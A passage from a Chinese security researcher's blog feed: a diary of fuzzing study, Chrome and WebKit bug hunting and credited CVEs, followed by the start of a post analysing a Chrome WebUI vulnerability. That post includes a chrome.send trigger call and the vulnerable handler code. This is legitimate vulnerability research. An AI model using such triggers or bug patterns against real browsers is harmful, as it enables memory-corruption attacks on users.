rel="noopener">https://conference.hitb.org/hitbsecconf2017ams/materials/D2T3%20-%20James%20Forshaw%20-%20Introduction%20to%20Logical%20Privilege%20Escalation%20on%20Windows.pdf</a></li><li>工控协议Fuzz的一个比较有趣的资料？<br><a href="https://mp.weixin.qq.com/s/QcGd746CkQVIxx847Zp8Jg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/QcGd746CkQVIxx847Zp8Jg</a></li><li>想学fuzz，等35C3 talk的PPT。</li></ol><h2 id="2018-12-27-31"><a href="#2018-12-27-31" class="headerlink" title="2018-12-27-31"></a>2018-12-27-31</h2><ol><li><p>35c3 video和日程整理<br><a href="https://media.ccc.de" target="_blank" rel="noopener">https://media.ccc.de</a><br><a href="https://fahrplan.events.ccc.de/congress/2018/Fahrplan/schedule/3.html" target="_blank" rel="noopener">https://fahrplan.events.ccc.de/congress/2018/Fahrplan/schedule/3.html</a></p></li><li><p>开始fuzz之旅<br>From Zero to Zero Day-Jonathan Jacobi<br><a href="https://www.youtube.com/watch?v=xp1YDOtWohw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=xp1YDOtWohw</a><br>Attacking Chrome IPC-nedwill<br><a href="https://www.youtube.com/watch?v=39yPeiY808w" target="_blank" rel="noopener">https://www.youtube.com/watch?v=39yPeiY808w</a><br>The Layman’s Guide to Zero-Day Engineering<br><a href="https://www.youtube.com/watch?v=WbuGMs2OcbE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=WbuGMs2OcbE</a></p></li><li><p>简述一下From Zero to Zero Day里我觉得有趣的东西</p><ul><li>基础很重要，其中最重要的就是c/c++/os(或者你具体研究的那个系统，比如浏览器)internal/能用python或者其他语言coding来实现自己的想法。<br>最后一点我觉得<a href="https://ktkitty.github.io/" target="_blank" rel="noopener">KT</a>师傅搞的非常棒，可惜我太菜了。</li><li>通过CTF或者具体的简单的小软件来学习关于漏洞的基础知识，不要害怕失败，从其他人的解法中你依然能学到非常多的东西，这里建议follow defcon预选赛和defcon的赛题，其他的可以不做，没有什么意义。<br>推荐一个系列教程<br><a href="http://liveoverflow.com/capture_the_flag/index.html" target="_blank" rel="noopener">http://liveoverflow.com/capture_the_flag/index.html</a><br><a href="https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w" target="_blank" rel="noopener">https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w</a><br>但是要注意，不要在“浅水区”待太久，你只要确保自己有继续进行研究的能力即可，我觉得半年可以完成这些事情，然后继续往下。</li><li>接下来需要的就是eat sleep pwn,repeat;2333<br>这里的建议是，当你掌握了一些trick和思路之后，你可以尝试去理解真实的漏洞，理解其中的pattern<br>比如你可以去看google project zero提交的漏洞，并研究他们。</li><li>后面的部分是一个有趣的漏洞和它的exp，不过这部分其实有点无聊。</li></ul></li></ol><p>我似乎懂了些什么有趣的东西，从jsc开始实践。why not v8?it’s difficult…）</p><ol start="4"><li>继续简述一下Attacking Chrome IPC里的一些我觉得关键的地方<ul><li>练习代码审计<ol><li>拿到一个已经存在的漏洞报告</li><li>知道漏洞大概发生在什么地方，或者是什么模块，不要去看完整的漏洞描述，尝试去发现漏洞。</li><li>如果你失败了，看一下漏洞报告，并且去总结你错过了什么地方。</li><li>重复这个过程，直到你觉得OK为止。</li></ol></li><li>练习fuzz<ol><li>请确定自己有充分的审计上的练习</li><li>拿到一个漏洞，通过自己写fuzz去trigger它。</li></ol></li><li>protobuf-mutator+libfuzzer</li></ul></li></ol><p>年终的最后几天，是一边睡觉一边和这些有趣的talk度过的，还看了35c3的v8题目，有一个逃逸分析的点想了半个月没想到，是我蠢了。<br>有趣的挑战，明年要继续努力了，夯实基础，砥砺前行。<br>一个人久了真的很累呀，新的一年，找个朋友一起住，一起打打游戏，搞搞研究，开开心~熬过这半年就好了。</p><h2 id="2019-1-1-2"><a href="#2019-1-1-2" class="headerlink" title="2019-1-1-2"></a>2019-1-1-2</h2><ol><li>写一个能跑的js fuzz，然后慢慢调。<br>lighthouse+lcov–&gt;feedback<br>dharma–&gt;语法生成<br>将两部分结合一下就是一个能跑的js fuzz，写代码真麻烦2333<br>今天大概看了看dharma的语法描述文件怎么写，想想要写一堆语法描述就麻烦。。</li><li>youtube上看到一个小系列The Art of Fuzzing，upx是真的很好fuzz。。很快一堆crash<br>然后是google的libfuzzerTutorial很有趣。<br><a href="https://github.com/google/fuzzer-test-suite/blob/master/tutorial/libFuzzerTutorial.md" target="_blank" rel="noopener">https://github.com/google/fuzzer-test-suite/blob/master/tutorial/libFuzzerTutorial.md</a></li><li>所以今天大概最后就是再看了一下webkid。</li></ol><h2 id="2019-1-3-9"><a href="#2019-1-3-9" class="headerlink" title="2019-1-3-9"></a>2019-1-3-9</h2><ol><li>研究safari jsc<br>safari JIT exploit<br><a href="https://www.youtube.com/watch?v=bqehb-YZ9jo" target="_blank" rel="noopener">https://www.youtube.com/watch?v=bqehb-YZ9jo</a><br><a href="https://share.weiyun.com/5IJZPBp" target="_blank" rel="noopener">https://share.weiyun.com/5IJZPBp</a><br>fuzz book<br><a href="https://www.fuzzingbook.org" target="_blank" rel="noopener">https://www.fuzzingbook.org</a><br>pizlo jsc<br><a href="http://www.filpizlo.com/slides/pizlo-splash2018-jsc-compiler-slides.pdf" target="_blank" rel="noopener">http://www.filpizlo.com/slides/pizlo-splash2018-jsc-compiler-slides.pdf</a><br><a href="http://www.filpizlo.com/" target="_blank" rel="noopener">http://www.filpizlo.com/</a><br>其他乱七八糟的paper<br><a href="https://llvm.org/devmtg/2014-10/Slides/Trick-FTL.pdf" target="_blank" rel="noopener">https://llvm.org/devmtg/2014-10/Slides/Trick-FTL.pdf</a><br>Array Bounds Check Elimination for the Java HotSpotTM Client Compiler<br><a href="http://www.ssw.uni-linz.ac.at/Research/Papers/Wuerthinger07/Wuerthinger07.pdf" target="_blank" rel="noopener">http://www.ssw.uni-linz.ac.at/Research/Papers/Wuerthinger07/Wuerthinger07.pdf</a></li></ol><h2 id="2019-1-12"><a href="#2019-1-12" class="headerlink" title="2019-1-12"></a>2019-1-12</h2><ol><li>研究编译原理<br><a href="https://www.bilibili.com/video/av17669734/?p=77" target="_blank" rel="noopener">https://www.bilibili.com/video/av17669734/?p=77</a><br>刷完视频刷书，重新看感觉有新收获，得到的认知就是：</li></ol><ul><li>要知道你看的这个东西是用来做什么的，解决什么问题的</li><li>它具体可能是怎么实现的，js引擎里是怎么实现的</li><li>modern compiler和书里的不同之处</li></ul><h2 id="2019-4-2"><a href="#2019-4-2" class="headerlink" title="2019-4-2"></a>2019-4-2</h2><p>不写日记感觉不能梳理自己每天在干嘛，就写一下好了。</p><ol><li><p>学习saelo的两个spiderMonkey漏洞<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1791" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1791</a><br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1810" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1810</a></p></li><li><p>学习saelo的jsc漏洞<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1753" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1753</a><br>关于ArrayWithSlowPutStorage</p></li></ol><h2 id="2019-4-24"><a href="#2019-4-24" class="headerlink" title="2019-4-24"></a>2019-4-24</h2><ol><li>在漫长的时间里无所作为，开始反省自己遇到的瓶颈到底是什么，除了chakra，其他浏览器的JIT优化漏洞总是越来越少了。<br>首先是在我花了很长时间的浏览器JIT优化方面，已经很久没有chrome v8的有趣漏洞出现了，我分析了龚广天府cup的漏洞，以及最近的那个FileReader的漏洞，有趣的是，它们的漏洞pattern都是，在处理超长的数据或者其他东西的时候，没有处理好，导致畸形数据或者错误的程序执行逻辑产生，但是并不太好迅速的针对进行审计。<br>我依然更感兴趣在优化漏洞上，尤其是大宝发现的那些chakra漏洞，非常有趣，但是v8里没有chakra那些奇奇怪怪的设计。</li><li>fuzz依然是我更感兴趣的方向，但是单纯js fuzz已经没什么前途了。。<br>和Atum这样的顶级二进制选手聊过之后，感觉自己在更多的软件实现，尤其是内核的一些东西上的欠缺，要更理解这些系统机制以及如何操纵它们才可以。<br><a href="https://github.com/A7um/syscallhook" target="_blank" rel="noopener">https://github.com/A7um/syscallhook</a><br>强的令人发指。。<br>通过顶级CTF来迭代知识依然是一个好的选择，抛弃掉无用的heap相关的赛题，剩下的题目质量依然很高很好，值得学习，尤其是c3 ctf。</li><li>挖了这么久漏洞，终于明白了，攻击面和结合攻击面去fuzz，是最合适的挖洞方法，剩下就是code smell。</li><li>我觉得逻辑漏洞是一个很有趣的方向，不知道有没有大佬带我玩，逆向一些国产小软件的进程间通信来找找漏洞啥的。</li></ol><h2 id="2019-4-25"><a href="#2019-4-25" class="headerlink" title="2019-4-25"></a>2019-4-25</h2><p>最近分析的比较有趣的浏览器漏洞。<br>Issue 1793: Chrome: Integer overflow in NewFixedDoubleArray<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1793" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1793</a><br>CVE-2019-5786 FileReader UaF<br>OOB Write in ValueDeserializer::ReadDenseJSArray (Tian Fu Cup）<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=905940" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=905940</a><br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=906313" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=906313</a><br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=914731" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=914731</a><br>现在看这些漏洞，有一些有趣的code smell了。浏览器对我来说慢慢的也已经变成了一个看得懂的东西呢，不过离挖到洞还早。</p><h2 id="2019-6-5"><a href="#2019-6-5" class="headerlink" title="2019-6-5"></a>2019-6-5</h2><p>我的CVE。</p><ol><li><a href="https://chromereleases.googleblog.com/2019/06/stable-channel-update-for-desktop.html" target="_blank" rel="noopener">https://chromereleases.googleblog.com/2019/06/stable-channel-update-for-desktop.html</a><br>[$TBD][950328] Medium CVE-2019-5831: Incorrect map processing in V8. Reported by yngwei(JiaWei, Yin) of IIE Varas and <strong>sakura of Tecent Xuanwu Lab</strong> on 2019-04-07</li><li><a href="https://support.apple.com/en-us/HT210123" target="_blank" rel="noopener">https://support.apple.com/en-us/HT210123</a><br>CVE-2019-8583: <strong>sakura of Tencent Xuanwu Lab</strong>, and dwfault working at ADLab of Venustech<br>从开始搞浏览器到现在，差不多就是一年，去掉一些零零碎碎的做其他事情的时间，可能大概半年多一些，我也有自己的google和apple致谢了。<br>刚刚好在我毕业答辩期间收到编号，可能是我的毕业礼物了，thanks~哈哈<br>既然发了日记就说一下我的理解，在实习的这一年里认识了非常多的大佬，我在xuanwu lab的导师sky还有lw和明月师傅他们，r3kapig的Ne0和Atum他们，还有和我一起讨论学习的yngwei和dwfault,jessica他们，都给了我非常多的帮助和启发。<br>在推特上面也认识了不少的朋友，以及follow了很多大佬，尤其是project zero的saelo，跟进最新的漏洞并分析，研究漏洞挖掘的新技术新手法，不断提升自己。<br>所以学习这件事情，最重要的就是开阔视野，你以为的有用的东西并不真的有用，实际的漏洞挖掘考察的是对目标的理解和深度，并不是说和简单的CTF pwn一样，只是hack game，ctf非常有意义，但是也要认识到这一点，真正决定你能不能挖到漏洞的，永远是对目标软件的理解，并没有什么特别特别通用的知识。<br>Just spend a long time learning and doing it, you will get better.</li></ol><h2 id="2019-6-6"><a href="#2019-6-6" class="headerlink" title="2019-6-6"></a>2019-6-6</h2><p>最近这几天一直在想漫长的一个月做点什么，嗯，没错，我毕业了，毕业答辩结束，应该没什么幺蛾子的话，会顺利的会玄武上班。<br>然后就有点迷茫，暂时，嗯，暂时不太想继续肝JS engine了，花了太久，产出有限，希望做些有趣的事情，嗯，当然fuzz还会继续跑。<br>想学的东西有点多，我是出于兴趣在搞技术的，有些复杂的东西其实不太想牵扯到其中，我喜欢挖到漏洞，喜欢和厉害的人交流技术弥补不足。<br>还想学更多有趣的东西。</p><h2 id="2019-6-23"><a href="#2019-6-23" class="headerlink" title="2019-6-23"></a>2019-6-23</h2><ol><li>拿到了毕业证和学位证，准备入职了，列一下计划。</li><li>和@aSiagaming一起解决gctf chrome sandbox escape pwn.<br><a href="https://capturetheflag.withgoogle.com/#challenges/sandbox-monochromatic" target="_blank" rel="noopener">https://capturetheflag.withgoogle.com/#challenges/sandbox-monochromatic</a><br>题目出处应该是这个issue。<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1755" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1755</a><br>现在需要补充大量的基础知识。</li><li>复习v8 JIT相关的知识和漏洞，准备一个share.</li><li>开始打hacker101的ctf，练习一些web的基础知识。</li><li>每天坚持锻炼和饮食。</li></ol><h2 id="2019-6-28"><a href="#2019-6-28" class="headerlink" title="2019-6-28"></a>2019-6-28</h2><ol><li>上班第一周，全在搬砖，一点漏洞研究的事情没做，粗略的翻了下ned的议题还有chrome mojo。</li><li>思想还需要转变，毕竟上班就是这样，leader让你干什么你就得干什么，哪怕你是造火箭的，也得来拧螺丝钉。</li><li>虽然很想挖洞，也觉得工作和自己想象中不一样，不够帅，但是，还是要积极调整啊。</li><li>我的第二个v8 cve可能要发下来了，开心。</li></ol><h2 id="2019-7-3"><a href="#2019-7-3" class="headerlink" title="2019-7-3"></a>2019-7-3</h2><ol><li>爬虫写的越来越快了。。我可以写篇博客讲爬虫了。。</li><li>学习natalie的挖洞思路，先把webrtc搭起来了。<br><a href="https://github.com/googleprojectzero/Street-Party/blob/master/WebRTC/record.patch" target="_blank" rel="noopener">https://github.com/googleprojectzero/Street-Party/blob/master/WebRTC/record.patch</a><br>natalie的编译脚本有点问题，改成下面这样就OK了,学习了一下谷歌的构建链。<br><a href="https://blog.csdn.net/Vincent95/article/details/70849035" target="_blank" rel="noopener">https://blog.csdn.net/Vincent95/article/details/70849035</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rtc_static_library(&quot;call&quot;) &#123;</span><br><span class="line">  sources &#x3D; [</span><br><span class="line">    &quot;call.cc&quot;,</span><br><span class="line">    &quot;call_factory.cc&quot;,</span><br><span class="line">    &quot;call_factory.h&quot;,</span><br><span class="line">    &quot;degraded_call.cc&quot;,</span><br><span class="line">    &quot;degraded_call.h&quot;,</span><br><span class="line">    &quot;flexfec_receive_stream_impl.cc&quot;,</span><br><span class="line">    &quot;flexfec_receive_stream_impl.h&quot;,</span><br><span class="line">    &quot;receive_time_calculator.cc&quot;,</span><br><span class="line">    &quot;receive_time_calculator.h&quot;,</span><br><span class="line">    &quot;..&#x2F;test&#x2F;rtp_file_writer.cc&quot;,</span><br><span class="line">    &quot;..&#x2F;test&#x2F;rtp_file_writer.h&quot;,</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  deps &#x3D; [</span><br><span class="line">    &quot;..&#x2F;rtc_base:rtc_json&quot;,</span><br></pre></td></tr></table></figure></li><li>调试分析漏洞。</li></ol><h2 id="2019-7-8"><a href="#2019-7-8" class="headerlink" title="2019-7-8"></a>2019-7-8</h2><ol><li>这周想给自己的漏洞写一下利用,CVE-2019-5831,issue-950328，这个洞是我回学校忙毕业的时候出的，一直没空仔细看，怎么说呢，从回学校毕业之后到现在，也有好几个月了，一直没有调试分析chrome漏洞了，其实对引擎的理解就还不够深刻，漏洞基本上是fuzz出的，这段时间也一直在考虑和去改fuzz，不过和大佬聊过之后觉得，挖漏洞这件事情，必须经常反思为什么别人能挖到，自己没挖到，是这个点没看到么，如果不是，那是什么原因。<br>嗯，是我看的还不够仔细，那就从自己的漏洞开始搞吧。</li></ol><h2 id="2019-7-28"><a href="#2019-7-28" class="headerlink" title="2019-7-28"></a>2019-7-28</h2><ol><li>这段时间基本上还是在改改FUZZ，然后挖到了我的第二个chrome v8 cve，其实是个很有趣的漏洞，等有空我会分享它，但总的来说，现在v8的JIT漏洞已经很难发现了，我现在主要发现的漏洞也不太和JIT有关，但是我很喜欢这类优化漏洞，所以我依然在梳理这方面的知识。</li><li>因为一些原因，重新看了看自己以前分析过的漏洞，在重新写文档，发现以前写的东西真的是和shi一样难看。在某个瞬间之后，我好像对这些漏洞的理解提升了，嗯，没有任何原因，就是单纯的随便翻了翻资料，重新看了看代码，看了看IR。</li><li>最近在腾讯的入职封闭培训，玩的还是很开心的，认识了更多有趣的人，嗯，都是大佬2333。其实最近是很迷茫的，对未来的迷茫，我好像走进了工作以后的第一个分叉点，但是开弓没有回头箭，我目前的目标就是认认真真的做安全研究，攻破每一个我没攻破过的目标。</li><li>说了这么多废话，其实这次的日记更新想写一些心得，这是我和某个大佬凌晨在湖边闲聊学到的。<br>在某个很长期的阶段，你会投身于某个领域，并对其进行深耕，但是如何保证你现在研究的，学到的知识，在五年后，甚至很短的一年后还有用，这其实是很难保证的，尤其是安全研究这个快速攻防迭代的领域，你积累下来的东西，很可能在下一年里就不再存在了，这当然有很多种不同的理解，其中之一是积累下来的东西还不够深，不够通用。<br>我认为逆向和开发的能力是十分重要的，比如当想到一个idea之后，能快速实现的coding能力，以及做任何非开源软件的攻防都必须具备的逆向能力。<br>嗯，说的比较笼统，但大家其实是可以思考一下，你学到的知识应该如何“保值”，如何提升自己的个人竞争力。</li></ol><h2 id="2019-8-8"><a href="#2019-8-8" class="headerlink" title="2019-8-8"></a>2019-8-8</h2><p>最近还是挺烦的，各种烦心的事情，不过还是记录一下这段时间做了什么。<br>这段时间把loki挖的chakra的历史漏洞看了一下，主要理解一下chakracore的codebase，方便后面分析样本，然后准备写一个导入语料的功能，这样就可以通过根据筛选语料来导入更多的，嗯，基因突变，哈哈。<br>还是有很多事情想做，但是受限于能力没做成，不过，加油吧。test</p><h2 id="2019-8-12"><a href="#2019-8-12" class="headerlink" title="2019-8-12"></a>2019-8-12</h2><ol><li>写了一下fuzzilli导入语料</li><li>todo list:<br>学习chrome sandbox escape<br><a href="https://labs.bluefrostsecurity.de/blog/2019/08/08/escaping-the-chrome-sandbox-via-an-indexeddb-race-condition/" target="_blank" rel="noopener">https://labs.bluefrostsecurity.de/blog/2019/08/08/escaping-the-chrome-sandbox-via-an-indexeddb-race-condition/</a></li></ol><h2 id="2019-9-12"><a href="#2019-9-12" class="headerlink" title="2019-9-12"></a>2019-9-12</h2><ol><li>最近我大概有新的chrome高危漏洞产出，期待下个月的致谢：），fuzz也有很多新思路在改了，target也不再局限在浏览器了</li><li>嘛，发生了好多事情…各方面都是，即将顺利的从玄武离职，其中个中曲折就不说了，社会人心险恶（茶</li><li>最近有挺多对安全研究和二进制漏洞挖掘怀有期望的年轻人问我问题，不过，我觉得他们需要好好审视几个问题。</li></ol><p>第一，是否有足够扎实的开发或者逆向基础，包括但不限于以下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.C++ STL实现一套tiny STL且熟悉STL源码</span><br><span class="line">2.Kernel自己实现一个，且熟悉Linux 2.6源码</span><br><span class="line">3.使用LLVM backend pass实现过compiler，可参考UToronto Compiler Optimization且熟悉libfuzzer源码</span><br></pre></td></tr></table></figure><p>第二，是否有追踪前沿的安全议题和漏洞，并有一些自己的思路和想法。<br>如果想清楚这些，并且能够做到上述的基础扎实，欢迎一起讨论问题呀2333</p><h2 id="2019-10-24"><a href="#2019-10-24" class="headerlink" title="2019-10-24"></a>2019-10-24</h2><ol><li>现在在360 alpha team端茶倒水学审计。</li><li>彻底分成工作日记和生活日记了。。都快忘记更新了，good luck.</li></ol><h2 id="2020-1-11"><a href="#2020-1-11" class="headerlink" title="2020-1-11"></a>2020-1-11</h2><p>新年快乐~民那桑</p><h2 id="2020-12-31"><a href="#2020-12-31" class="headerlink" title="2020-12-31"></a>2020-12-31</h2><p>新的一年发生了很多事，做个年末小总结。</p><ol><li>去年到今天挖了三个chrome的高危漏洞，sqlite漏洞若干，从完全fuzzer转向部分代码审计，新的一年预计还会再深挖一些其他方向，捡一点软柿子捏捏。</li><li>做了一些内核方面的安全研究探索，不过有点失败，然后补了若干基础知识。</li><li>业余时间教了一些小朋友，不少都去大厂实习了。</li></ol><h1 id="2021-12-1"><a href="#2021-12-1" class="headerlink" title="2021-12-1"></a>2021-12-1</h1><p>今年也快结束了，稍微做个小总结吧，我的日记也很久没更新过了。</p><ol><li>今年的主要工作可能是在写js fuzz，网上开源的那些js fuzz没有一个用的顺手，索性码了几个月，写了2w+行cpp代码，完成了一个从读入js解析到ast变异的成品js fuzz，很有成就感，也帮助我挖了一批漏洞出来。</li><li>写了一个adobe reader pdfjs fuzz，也是出了一些漏洞，包括一个最新版可用的UAF，还需要继续调整，但确实算是初步入门了文件格式fuzz。</li><li>算上之前写的sqlite fuzz(需要重构)，我基本上也是覆盖了语义fuzz这块的完整技能栈了，比较有成就感，但是还不够。</li><li>codeql帮我找了不少沙箱洞，但是这个难以持续，我可能确实不太擅长做这种审计，但不妨碍codeql是一个极好的工具。</li><li>明年我想往逆向和fuzz这块继续做下去，尽量出一些好用的闭源fuzz出来。</li></ol><h1 id="2022-12-6"><a href="#2022-12-6" class="headerlink" title="2022-12-6"></a>2022-12-6</h1><p>今年的年末总结趁着居家的最后一天写一下，又是一年过去了呢。</p><ol><li>今年通过CodeQL+Fuzz大概挖了30余个Chrome漏洞，考虑到我因为一些原因是今年四月份开始挖的，姑且也算是勉强达到了一周一个洞的指标吧。</li><li>我今年到9月之前的主要工作是通过codeql审计漏洞模式，然后审了不少需要交互的UI或者边缘组件漏洞，后来chrome调整了奖励策略，鼓励远程无交互漏洞之后，我又回归了我的老本行搞Chrome Fuzz，通过基于变异和生成的浏览器Fuzz，我在WebGL和RenderFrame*上都出了几个高价值的漏洞，可以期待公开 :)</li><li>此外我今年第一次带实习生，我的实习生陈子灵和丁杰都很不错。<ul><li>子灵同学在实习过程，基于我之前在SQLite的Fuzz工作进行继续的开发和审计，最终挖掘了多个高价值可利用的SQLite漏洞，SQLite是Chrome WebSQL的底层组件，所以可以用SQLite的漏洞来攻破Chrome，当然Chrome有它的白名单，所以并不是所有SQLite漏洞都能触发，我们目前提交了3个Chrome WebSQL的漏洞，分别可以造成任意地址读和越界写任意长度的效果，很接近RCE了，还有一些0day漏洞握在手上，具体的工作我们还在投稿blackhat，希望能中选。</li><li>丁杰同学在实习过程中，由于许多国产软件都有内置浏览器，所以和我一起为国产IM和国产办公软件编写了很多1day exp，并用于比赛，极大的改善了国产软件的安全性。他也基于我的js fuzzer工作为某pdf js引擎挖掘了0day RCE漏洞并编写了exp，虽然最终我们拿了一个多月之后被撞掉了，此外我们还有一些某国外大厂js引擎的类型混淆或者潜在UAF 0day漏洞，正在努力编写exp。</li><li><strong>由于今年公司的一些调整，他们未能拿到正式offer，但是他们的技术水平都相当好，如果有需要招聘校招生的话，请联系我，我正在为他们寻找工作 :）</strong></li></ul></li><li>明年的计划是继续深入探索浏览器的漏洞挖掘边界，挖掘100个Chrome/Edge/Safari/Firefox的漏洞，达到3天一个漏洞的水平吧，如果有大佬想和我交流也请联系我 :)</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;建了一个知识星球：天问之路&quot;&gt;&lt;a href=&quot;#建了一个知识星球：天问之路&quot; class=&quot;headerlink&quot; title=&quot;建了一个知识星球：天问之路&quot;&gt;&lt;/a&gt;建了一个知识星球：天问之路&lt;/h2&gt;&lt;p&gt;如果想学习二进制安全，或者和我交流，欢迎来这里找我w
      
    
    </summary>
    
    
      <category term="学习日记" scheme="http://eternalsakura13.com/categories/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="sakuraのsakura" scheme="http://eternalsakura13.com/tags/sakura%E3%81%AEsakura/"/>
    
  </entry>
  
  <entry>
    <title>WebUI:The easiest attack surface in Chromes</title>
    <link href="http://eternalsakura13.com/2022/12/03/webui/"/>
    <id>http://eternalsakura13.com/2022/12/03/webui/</id>
    <published>2022-12-03T05:09:52.847Z</published>
    <updated>2022-12-03T05:21:49.155Z</updated>
    
    <content type="html"><![CDATA[<p>“WebUI “是一个术语，用于宽泛地描述用网络技术（即HTML、CSS、JavaScript）实现的Chrome浏览器的部分UI。</p><p>Chromium中的WebUI的例子。</p><ul><li>Settings (chrome://settings)</li><li>History (chrome://history)</li><li>Downloads (chrome://downloads)</li></ul><p>关于webui具体怎么工作在这里将不展开，请参考官方文档详细阅读，本文将重点介绍webui中常见的几类漏洞模式。</p><p><a href="https://chromium.googlesource.com/chromium/src/+/master/docs/webui_explainer.md" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src/+/master/docs/webui_explainer.md</a></p><h1 id="find-but-no-check-end"><a href="#find-but-no-check-end" class="headerlink" title="find but no check end"></a>find but no check end</h1><p>我们将以一个简单的漏洞模式来学习webui的数据流传递。</p><p>具体的说就是每个WebUI都会注册很多WebUIMessageHandler，而每个Handler上又会注册多个Message Callback，每个Message Callback都有一个对应的Message Name，可以通过这个Message Name来调用到对应的webui函数，并传入参数。</p><p>具体来说就是形如以下调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome.send(&quot;recordNavigation&quot;,[1337,0]);</span><br></pre></td></tr></table></figure><h2 id="case1-issue-1303614"><a href="#case1-issue-1303614" class="headerlink" title="case1: issue-1303614"></a>case1: issue-1303614</h2><p>由于该漏洞代码只存在于chromium dev，不存在发行版中，所以没有CVE，只有对应的issue编号。</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><ul><li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1303614" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=1303614</a></li></ul><p>让我们看一下代码，这里注册了一个名为recordNavigation的Message Callback，它将对应调用到HandleRecordNavigation函数，并处理传入的参数。</p><p>它将对传入的参数列表依次调用ConvertToNavigationView，将其强制转换为NavigationView类型的枚举值，分别得到from_view和to_view。</p><p>但由于这里并没有检查传入的参数是否小于NavigationView类型能处理的最大值，注意这里仅仅只有一个debug check，这个debug check在release发行版里是不存在的，所以可以试做没有检查。</p><p>这将导致在EmitScreenOpenDuration函数处理cast之后得到的from_view的时候， 触发一个堆溢出。</p><p>这里它将对kOpenDurationMetrics列表进行find，但是由于没有检查传入的参数是否小于NavigationView类型能处理的最大值，所以它将find不到。</p><p>我们知道在c++里，find如果找不到，迭代器iter将指向end，这其实代表的是指向容器的最后一个元素的<strong>下一个</strong>。</p><p>而这里同样也没有检查find找不到的情况，也就是没有检查iter是否指向end，就直接解引用了。它同样也是使用了一个Debug Check，但这其实是无用的。</p><p>所以对iter解引用将直接越界，造成buffer overflow。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// content::WebUIMessageHandler:</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DiagnosticsMetricsMessageHandler::RegisterMessages</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  DCHECK(web_ui());</span><br><span class="line"></span><br><span class="line">  web_ui()-&gt;RegisterMessageCallback(</span><br><span class="line">      kRecordNavigation, <span class="comment">//-----&gt;"recordNavigation"</span></span><br><span class="line">      base::BindRepeating(</span><br><span class="line">          &amp;DiagnosticsMetricsMessageHandler::HandleRecordNavigation,</span><br><span class="line">          base::Unretained(<span class="keyword">this</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="class"><span class="keyword">class</span> <span class="title">NavigationView</span> &#123;</span></span><br><span class="line">  kSystem = <span class="number">0</span>,</span><br><span class="line">  kConnectivity = <span class="number">1</span>,</span><br><span class="line">  kInput = <span class="number">2</span>,</span><br><span class="line">  kMaxValue = kInput,</span><br><span 